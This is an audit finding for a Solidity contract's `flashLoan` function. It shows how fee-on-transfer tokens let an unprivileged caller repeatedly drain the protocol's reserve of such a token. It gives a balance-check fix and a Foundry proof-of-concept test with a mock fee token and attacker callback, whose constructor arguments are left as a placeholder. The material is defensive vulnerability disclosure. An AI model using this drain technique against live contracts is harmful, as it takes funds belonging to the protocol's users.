### Title
`flashLoan` is not balance-neutral for fee-on-transfer tokens, causing direct loss of protocol funds - (File: src/Midnight.sol)

### Summary
`Midnight.flashLoan` transfers out `assets[i]` to the callback and then pulls back exactly `assets[i]` from the callback with no pre/post balance check. When the token is fee-on-transfer, the inbound `safeTransferFrom` at line 750 delivers only `assets[i] * (1 - fee)` to Midnight, so Midnight's net balance decreases by `assets[i] * fee` per flash loan. No access control or token whitelist prevents an unprivileged caller from triggering this with any token.

### Finding Description
The full execution path in `flashLoan` is:

1. **Line 743** – `SafeTransferLib.safeTransfer(tokens[i], callback, assets[i])`: Midnight is the *sender*; its balance decreases by exactly `assets[i]`. The fee-on-transfer deduction is borne by the *recipient* (callback), which receives only `assets[i] * (1 - fee)`. Midnight does not lose the fee on this leg.
2. **Lines 745-748** – callback returns `CALLBACK_SUCCESS`.
3. **Line 750** – `SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i])`: Midnight is the *recipient*; the token contract deducts the fee from the transferred amount, so Midnight receives only `assets[i] * (1 - fee)` despite the call requesting `assets[i]`. Midnight loses `assets[i] * fee` on this leg.

Net balance change for Midnight: `-assets[i] + assets[i]*(1-fee) = -assets[i]*fee`.

There is no pre/post balance snapshot, no minimum-received check, and no token whitelist. The Certora `Solvency.spec` formal model explicitly excludes this case with the assumption *"no fee taking from sender or receiver"* (line 31), so the formal proofs do not cover it. [1](#0-0) [2](#0-1) 

For the `safeTransferFrom` to succeed, the callback must hold at least `assets[i]` tokens. Since it only received `assets[i]*(1-fee)` on the outbound leg, it must pre-fund `assets[i]*fee` extra. The attacker's cost is `assets[i]*fee`; Midnight's loss is also `assets[i]*fee`. A griefing attacker can drain Midnight's entire FOT-token reserve by repeatedly calling `flashLoan` with the maximum available balance, paying only the fee each iteration.

### Impact Explanation
Every `flashLoan` call with a fee-on-transfer token permanently removes `assets[i] * fee` tokens from Midnight's balance. These tokens are not accounted for in any market state, so the loss is unrecoverable. Repeated calls drain the full FOT-token reserve held by the protocol, directly violating the invariant that contract balances cover collateral, credit redemption, fees, and withdrawable assets.

### Likelihood Explanation
- **Preconditions**: Midnight must hold a non-zero balance of a fee-on-transfer token (e.g., deposited as collateral or loan token in a market). The attacker needs no special role.
- **Feasibility**: Any externally-owned account can call `flashLoan` with no prerequisites beyond having enough of the FOT token to cover the fee on the repayment leg.
- **Repeatability**: The attack is fully repeatable in a loop until Midnight's balance of the token is exhausted.

### Recommendation
Add a per-token balance snapshot before the outbound transfers and assert the balance is restored after the inbound transfers:

```solidity
uint256[] memory balancesBefore = new uint256[](tokens.length);
for (uint256 i = 0; i < tokens.length; i++) {
    balancesBefore[i] = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
}
require(
    IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
    WrongFlashLoanCallbackReturnValue()
);
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(
        IERC20(tokens[i]).balanceOf(address(this)) >= balancesBefore[i],
        FlashLoanNotRepaid()
    );
}
```

This makes `flashLoan` balance-neutral regardless of token transfer mechanics.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

// 1% fee-on-transfer token: recipient receives amount * 99/100
contract FeeOnTransferToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public constant FEE_BPS = 100; // 1%

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount; return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fee = amount * FEE_BPS / 10000;
        uint256 received = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += received;
        // fee is burned
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount); return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount); return true;
    }
}

contract FotFlashLoanCallback is IFlashLoanCallback {
    FeeOnTransferToken public token;
    Midnight public midnight;

    constructor(FeeOnTransferToken _token, Midnight _midnight) {
        token = _token;
        midnight = _midnight;
    }

    function onFlashLoan(address, address[] memory tokens, uint256[] memory assets, bytes memory)
        external returns (bytes32)
    {
        // Callback received assets[0]*(1-fee). Pre-fund the fee so repayment doesn't revert.
        // Approve midnight to pull assets[0] back.
        token.approve(address(midnight), assets[0]);
        return CALLBACK_SUCCESS;
    }
}

contract FotFlashLoanTest is Test {
    FeeOnTransferToken token;
    Midnight midnight;
    FotFlashLoanCallback cb;

    function setUp() public {
        midnight = new Midnight(/* constructor args */);
        token = new FeeOnTransferToken();
        cb = new FotFlashLoanCallback(token, midnight);
    }

    function testFotFlashLoanDrainsMidnight() public {
        uint256 loanAmount = 1_000e18;
        // Seed Midnight with tokens
        token.mint(address(midnight), loanAmount);
        // Pre-fund callback with enough to cover the fee on repayment leg
        uint256 fee = loanAmount * 100 / 10000; // 1%
        token.mint(address(cb), fee);

        uint256 balBefore = token.balanceOf(address(midnight));

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory assets = new uint256[](1);
        assets[0] = loanAmount;

        midnight.flashLoan(tokens, assets, address(cb), "");

        uint256 balAfter = token.balanceOf(address(midnight));

        // Midnight loses fee * loanAmount (one leg, not two)
        assertEq(balBefore - balAfter, fee, "Midnight lost fee*assets on inbound leg");
        // Midnight did NOT recover the full loanAmount
        assertLt(balAfter, balBefore);
    }
}
```

**Key assertion**: `balBefore - balAfter == fee * assets[i]` (i.e., `10e18` for a 1% fee on `1000e18`). The PoC in the question claims `2*fee*assets[i]`; the correct loss is `fee*assets[i]` because the outbound fee is borne by the callback (recipient), not Midnight (sender). The vulnerability is real regardless. [3](#0-2) [4](#0-3)
